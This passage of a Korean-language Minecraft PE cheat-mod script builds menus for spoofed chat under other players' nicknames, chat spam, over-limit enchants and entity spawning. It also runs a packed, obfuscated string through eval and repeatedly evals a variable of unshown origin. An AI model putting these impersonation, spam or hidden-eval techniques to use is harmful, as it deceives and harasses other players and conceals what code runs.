btnT[1].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
f.tf = onoff;
if(onoff) Dark.toast("블록 끝에 걸쳐있는 경우도 나는것으로 인식됩니다.");
}
}));
btnT[2].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
signTp = onoff;
}
}));
btnT[3].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeCmdBtn(onoff);
}
}));
btnT[4].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
makeChatBtn(onoff);
}
}));
btnT[5].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
antiChat = onoff;
}
}));
btnT[6].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
blockLog = onoff;
}
}));
btnT[7].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
noPlayer = onoff;
}
}));
btnT[8].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
hyperLogOn = onoff;
if(onoff) saveHyperLog();
Dark.save("log", hyperLogOn);
}
}));
btnT[9].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
antiBlock = onoff;
}
}));
btnT[10].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(Dark.read("seedLink")=="true"){
theSeed = onoff;
Dark.save("theSeed", onoff);
}
else{
Dark.toast("스크립트가 연동되어 있지 않습니다.");
}
}
}));
if(multi){
layout.addView(btnT[3]);
layout.addView(btnT[4]);
layout.addView(btnT[6]);
}
else{
for(var n in menusT)
layout.addView(btnT[n]);
}
var btns = new Array();
var menus = ["블록 설치 내역", "대화 내용 보기", "채팅창 비우기", "채팅 조작", "채팅 무시 설정", "서버원 접속 내역", "하이퍼 로그 보기", "플레이어 이동 금지"];
for(var n in menus)
btns[n] = makeButton(menus[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("블록 설치 내역", blockString);
}
});
btns[0].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
blockString = "";
Dark.toast("블록 설치 내역이 초기화 되었습니다.");
return true;
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
showChatLog();
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
var pe= Player.getEntity();
var pn = Player.getName(pe);
Entity.setNameTag(pe, "");
for(var n=0;n<20;n++)
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("");
if(fixSendChat) clientMessage("");
Entity.setNameTag(pe, pn);
net.zhuoweizhang.mcpelauncher.ScriptManager.callScriptMethod("chatReceiveHook", ["채팅창 비우기 사용", "Dark Cheater"]);
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
fakeChat();
}
});
btns[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
chatIgnoreDialog();
}
});
btns[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("서버 접속 내역", serverLog);
}
});
btns[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("하이퍼 로그", getHyperLog()+"\n"+hyperLog);
}
});
btns[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
antiMoveDialog();
}
});
if(!multi){
for(var n in menus)
layout.addView(btns[n]);
}
else{
layout.addView(btns[0]);
}
var exit = makeExit(menuS2);
layout.addView(exit);
var scroll = makeScroll(layout, menuS2);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuS2.setContentView(layout2);
menuS2.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function fakeChat(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("닉네임 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("닉네임을 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc3.setText("채팅 내용 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("채팅 내용을 입력하세요...");
loc4.setTextColor(white);
layout.addView(loc3);
layout.addView(loc4);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("채팅 조작");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
var pe = Player.getEntity();
var pn = Player.getName(pe);
Entity.setNameTag(pe, loc2.getText()+"");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(loc4.getText()+"");
if(fixSendChat) clientMessage("<"+loc2.getText()+"> "+loc4.getText());
Entity.setNameTag(pe, pn);
Dark.toast("조작된 메시지를 보냈습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function spawnEntity(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var entType2 = 0;
var ents = ["엔티티 선택", "충전된 크리퍼", "아기 좀비", "아기 좀비 피그맨", "스파이더 조키", "치킨 조키"];
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, ents);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
entType2 = p;
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("수 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("스폰할 엔티티의 수를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
est = entType2;
esn = Number(loc2.getText());
Dark.toast("터치하시면 스폰됩니다.");
}
}));
dialog.setTitle("엔티티 스폰");
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function antiEntityList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var names = ["닭", "소", "돼지", "양", "늑대", "NPC", "버섯소", "오징어", "토끼", "박쥐", "아이언 골램", "스노우 골램", "오셸롯", "좀비", "크리퍼", "스켈레톤", "거미", "좀비 피그맨", "슬라임", "엔더맨", "좀벌레", "동굴 거미", "가스트", "마그마 큐브", "블레이즈", "좀비 NPC", "마녀", "드롭된 아이템", "활성화된 TNT", "떨어지는 블록", "경험치 포션", "경험치", "낚싯대", "화살", "눈덩이", "달걀", "그림", "마인카트", "화염구", "투척 포션", "보트", "번개", "작은 화염구", "카메라", "깔때기 마인 카트", "TNT 마인 카트", "창고 마인 카트"];
var entityIds = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 64, 65, 66, 68, 69, 77, 80, 81, 82, 83, 84, 85, 86, 90, 93, 94, 95, 96, 97, 98];
var checkBox = new Array();
for(var n in names){
checkBox[n] = new android.widget.CheckBox(ctx);
checkBox[n].setText(names[n]);
checkBox[n].setTextColor(white);
checkBox[n].setId(n);
if(antiEnt.indexOf(entityIds[n])==-1) checkBox[n].setChecked(false);
else checkBox[n].setChecked(true);
checkBox[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff) antiEnt.push(entityIds[check.getId()]);
else antiEnt.splice(antiEnt.indexOf(entityIds[check.getId()]), 1);
}
}));
layout.addView(checkBox[n]);
}
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("엔티티 스폰 방지 설정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function enchantDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var types = ["수중 호흡", "살충", "폭발 저항", "친수성", "효율", "가벼운 착지", "화염검", "화염 보호", "화염활", "행운", "무한", "밀치기", "약탈", "바다 행운", "미끼", "힘", "원거리 보호", "보호", "때리기", "호흡", "날카로움", "섬세한 손길", "강타", "가시", "내구성"];
var typeId = new Array();
var checks = new Array();
for(var n in types){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(types[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
typeId.push(check.getId());
}
else if(onoff==false){
typeId.splice(typeId.indexOf(check.getId()), 1);
}
}
}));
layout.addView(checks[n]);
}
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("인첸트 - 종류");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
enchantPower(typeId);
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function enchantPower(typeId){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var type = [Enchantment.AQUA_AFFINITY, Enchantment.BANE_OF_ARTHROPODS, Enchantment.BLAST_PROTECTION, Enchantment.DEPTH_STRIDER, Enchantment.EFFICIENCY, Enchantment.FEATHER_FALLING, Enchantment.FIRE_ASPECT, Enchantment.FIRE_PROTECTION, Enchantment.FLAME, Enchantment.FORTUNE, Enchantment.INFINITY, Enchantment.KNOCKBACK, Enchantment.LOOTING, Enchantment.LUCK_OF_THE_SEA, Enchantment.LURE, Enchantment.POWER, Enchantment.PROJECTILE_PROTECTION, Enchantment.PROTECTION, Enchantment.PUNCH, Enchantment.RESPIRATION, Enchantment.SHARPNESS, Enchantment.SILK_TOUCH, Enchantment.SMITE, Enchantment.THORNS, Enchantment.UNBREAKING];
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("강도: ");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("강도를 입력하세요");
txt2.setTextColor(white);
txt2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
layout.addView(txt1);
layout.addView(txt2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("인첸트 - 강도");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(!Dark.isMulti()||(Number(txt2.getText())<=elr2&&Number(txt2.getText())>=-100)||elr){
for(var n in typeId){
net.zhuoweizhang.mcpelauncher.ScriptManager.nativePlayerEnchant(Player.getSelectedSlotId(), type[typeId[n]], Number(txt2.getText()));
}
Dark.toast("인첸트를 하였습니다.");
}
else{
Dark.toast("테러 방지를 위해 걸어놓은 인첸트 허용 범위를 초과하였습니다.");
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function inputItemName(typeId){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("아이템 이름 : ");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("아이템의 새로운 이름을 입력하세요");
txt2.setTextColor(white);
layout.addView(txt1);
layout.addView(txt2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("아이템 이름 변경");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Player.setItemCustomName(Player.getSelectedSlotId(), txt2.getText().toString());
Dark.toast("아이템의 이름을 "+txt2.getText()+"(으)로 바꿨습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function chatIgnoreDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = new Array();
var playerNames = new Array();
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
var players2 = players.sort();
players = players2;
}
for each(var e in players){
playerNames.push(Player.getName(e));
}
var checks = new Array();
for(var n in players){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(playerNames[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
if(chatIgnore.indexOf(playerNames[n])!=-1) checks[n].setChecked(true);
else checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
chatIgnore.push(playerNames[check.getId()]);
}
else if(onoff==false){
chatIgnore.splice(chatIgnore.indexOf(playerNames[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("채팅 무시 대상자 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function inputTitle(arr){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var color = "f";
var colors = ["색상 선택", "검정", "어두운 파랑", "어두운 초록", "어두운 하늘색", "어두운 빨강", "어두운 보라색", "금색", "회색", "어두운 회색", "파랑", "초록", "하늘색", "빨강", "밝은 보라", "노랑", "흰색"];
var colorCodes = ["f", 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, "a", "b", "c", "d", "e", "f"]
var spin = new android.widget.Spinner(ctx);
var adapter = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, colors);
spin.setAdapter(adapter);
spin.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
color = colorCodes[p];
}
}));
layout.addView(spin);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("칭호 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("칭호를 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(arr==null){
Entity.setNameTag(playerTarget, "§"+color+"["+loc2.getText()+"] §f"+Player.getName(playerTarget));
}
else{
for each(var pp in arr)
Entity.setNameTag(pp, "§"+color+"["+loc2.getText()+"] §f"+Player.getName(pp));
}
Dark.toast("칭호를 부여하였습니다.");
}
}));
dialog.setTitle("칭호 부여");
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function webViewSetting(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = new Array();
var menuT = ["전체 화면", "자바스크립트 허용", "줌 인/아웃 활성화", "폼 데이터 저장", "비밀번호 저장"];
for(var n in menuT){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menuT[n]);
btnT[n].setTextOff(menuT[n]);
btnT[n].setId(n);
btnT[n].setChecked(wvsa[n]);
btnT[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
wvsa[toggle.getId()] = onoff;
}
}));
layout.addView(btnT[n]);
}
var hs = new android.widget.Button(ctx);
hs.setText("홈페이지 설정");
hs.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
setHome();
}
});
layout.addView(hs);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("웹 브라우저 설정");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function chatTerrorSetting(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var ns = new android.widget.CheckBox(ctx);
ns.setText("반복 횟수 표시");
ns.setChecked(showNumber);
ns.setTextColor(white);
ns.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
showNumber = onoff;
}
}));
layout.addView(ns);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("도배 문구 : ");
loc1.setTextSize(18);
loc2.setHint("도배 문구를 입력하세요...");
loc2.setText(chatTerrorString+"");
loc1.setTextColor(white);
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc3.setText("도배 횟수 : ");
loc3.setTextSize(18);
loc4.setHint("도배 횟수를 입력하세요...");
loc4.setInputType(number);
loc4.setText(chatTerrorN+"");
loc3.setTextColor(white);
loc4.setTextColor(white);
layout.addView(loc3);
layout.addView(loc4);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("도배기 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
chatTerrorString = loc2.getText().toString();
if(chatTerrorString==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/chat.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("chat", chatTerrorString);
}
chatTerrorN = Number(loc4.getText());
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function openIdBlackList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var list = new android.widget.EditText(ctx);
list.setHint("이 맵에 접속할 수 없도록 차단할 플레이어를 불러오세요...");
list.setText(blackListId);
list.setTextColor(white);
layout.addView(list);
var pl = new android.widget.Button(ctx);
pl.setText("접속중인 플레이어 목록에서 불러오기");
pl.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
playerList(list, true);
}
});
layout.addView(pl);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("맵 접속 방지");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
blackListId = list.getText().toString();
if(list.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/banData/"+Level.getWorldDir()+".txt");
if(file.exists()) file.delete();
}
else{
Dark.save("banData/"+Level.getWorldDir(), blackListId);
}
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function saveHyperLog(){
if(hyperLogOn){
new java.lang.Thread({
run : function(){
try{
java.lang.Thread.sleep(60000);
var cache = getHyperLog();
Dark.save("hyperLog/"+Dark.getTime(1), cache+"\n"+hyperLog);
Dark.toast("하이퍼 로그가 저장되었습니다.");
saveHyperLog();
}
catch(e){
clientMessage(e);
}
}
}).start();
}
else{
return;
}
}
saveHyperLog();


function serverCheck(){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('s 6="\\g\\c\\m\\d\\7\\n\\o\\a\\8\\c\\e\\7\\d\\8\\9\\p\\e\\e\\a\\8\\b\\b\\7\\d\\8\\9\\u\\v\\a\\9\\7\\b\\g\\8\\8\\k\\7\\b\\9\\c\\a\\9".l("\\7");j h[6[0]][6[1]]({q:r(){i(t){i(f[6[2]]()!=w){x(f[6[2]](),f[6[3]](),y);z}h[6[0]][6[1]][6[4]](A);B()}}})[6[5]]();',38,38,'||||||nox|xXY|x65|x74|x72|x73|x61|x67|x64|Server|x6C|java|if|new|x70|split|x6E|x54|x68|x41|run|function|var|makeGUI|x50|x6F|null|serverConnectedHook|true|return|500|serverCheck'.split('|'),0,{});
eval(code);
}
serverCheck();


function serverConnectedHook(ip, port, tf){
if(hyperLogOn&&tf) hyperLog += "["+Dark.getTime(2)+"] 서버 접속 (ip : "+ip+", 포트 : "+port+")\n";
if(btnRe&&dce.re) Dark.makeButton();

}


function openWhiteList(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var list = new android.widget.EditText(ctx);
list.setHint("닉네임을 입력하세요...");
list.setText(whiteList);
list.setTextColor(white);
layout.addView(list);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("화이트 리스트");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
whiteList = list.getText().toString();
if(list.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/whiteList.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("whiteList", whiteList);
}
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function getHyperLog(){
if(Dark.read("hyperLog/"+Dark.getTime(1))==null) return "";
else return Dark.read("hyperLog/"+Dark.getTime(1)).toString();

}


function callModTick(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function() {
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
modTick();
if(modTickOnoff) callModTick();
}
}), 50);
}
}));
}


function makeMcBtn(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
mcBtn = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = new Array();
var menus = ["M.C.", "P.M."];
var tfs = [mc, mc2];
for(var n in menus){
btnT[n] = new android.widget.ToggleButton(ctx);
btnT[n].setTextOn(menus[n]);
btnT[n].setTextOff(menus[n]);
btnT[n].setTextSize(13);
btnT[n].setTextColor(white);
btnT[n].setId(n);
btnT[n].setChecked(tfs[n]);
btnT[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
if(onoff){
mc = true;
Dark.toast("Magic Carpet on");
mc2 = false;
}
else{
mc = false;
Dark.toast("Magic Carpet off");
for(var xx=mx-2;xx<mx+3;xx++)
for(var yy=my-1;yy<my+2;yy++)
for(var zz=mz-2;zz<mz+3;zz++)
if(getTile(xx, yy, zz)==20){
setTile(xx, yy, zz, 0);
}
mt = -1;
}
break;
case 1 : 
mc2 = onoff;
if(onoff) Dark.toast("하강모드 활성화");
else Dark.toast("하강모드 비활성화");
break;
}
}
}));
layout.addView(btnT[n]);
}
setDragListener(mcBtn, btnT[0], 2);
mcBtn.setContentView(layout);
mcBtn.setWidth(dip2px(ctx, 60));
mcBtn.setHeight(dip2px(ctx, 100));
mcBtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
mcBtn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, dip2px(ctx, 82), dip2px(ctx, 70));
}
else{
if(mcBtn!=null){
mcBtn.dismiss();
mcBtn = null;
}
}
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function darkCheaterTick(){
new java.lang.Thread({
run : function(){
try{
eval(dce.bbb+"");
if(Dark.read("bm")=="true"){
Dark.makeButton();
Dark.save("bm", false);
Dark.toast(" 완료");

}
java.lang.Thread.sleep(100);
darkCheaterTick();
}catch(e){Dark.toast(e);}
}
}).start();
tickCount = 0;
}
darkCheaterTick();


function itemSearch(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc2 = new android.widget.EditText(ctx);
loc2.setTextColor(white);
loc2.setHint("검색어를 입력하세요...");
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("아이템 검색");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
try{
var items = [];
var codes = [0, 9, 11, 64, 95, 97, 140, 144, 246, 248, 249, 255, 373, 383, 439];
var names = ["공기", "멈춘 물", "멈춘 용암", "문(블록)", "보이지 않는 베드락", "몬스터 스폰알(?)", "화분", "머리", "빛나는 옵시디언", "업데이트 블록 1", "업데이트 블록 2", "오류 돌", "물병(포션)", "스폰알", "카메라"];
var codes2 = [1, 5, 6, 17, 18, 24, 35, 38, 43, 44, 79, 97, 98, 155, 159, 161, 162, 171, 175, 333, 349, 350, 351, 373, 438];
var lengths = [7, 6, 6, 4, 4, 3, 16, 9, 8, 8, 2, 6, 3, 3, 16, 2, 2, 16, 6, 6, 4, 4, 16, 36, 36];
for(var n=0;n<4096;n++){
if(net.zhuoweizhang.mcpelauncher.ScriptManager.nativeIsValidItem(n)){
if(codes.indexOf(n)==-1){
items.push([n, 0, net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetItemName(n, 0, false)]);
}
else if(n==383){
var entityIds = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45];
var codes3 = [20, 21, 44];
var names3 = ["아이언 골램 생성", "스노우 골램 생성", "좀비 주민 생성"];
for(var m=0;m<entityIds.length;m++){
if(codes3.indexOf(m)!=-1) items.push([383, entityIds[m], names3[codes3.indexOf(m)]]);
else items.push([383, entityIds[m], net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetItemName(383, entityIds[m], false)]);
}
}
else{
items.push([n, 0, names[codes.indexOf(n)]]);
}
if(codes2.indexOf(n)!=-1){
for(var m=1;m<lengths[codes2.indexOf(n)];m++){
items.push([n, m, net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetItemName(n, m, false)]);
}
}
}
}
var str = loc2.getText().toString();
var result = [];
var result2 = [];
for(var n in items){
if(items[n].toString().search(str)!=-1){
result.push(items[n]);
result2.push("아이디 : "+items[n][0]+", 데미지 : "+items[n][1]+", 이름 : "+items[n][2]);
}
}
if(result[0]!=null) showResult(str, result, result2);
else Dark.toast("검색 결과가 없습니다.");
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function showResult(str, items, names){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setItems(names, new android.content.DialogInterface.OnClickListener({
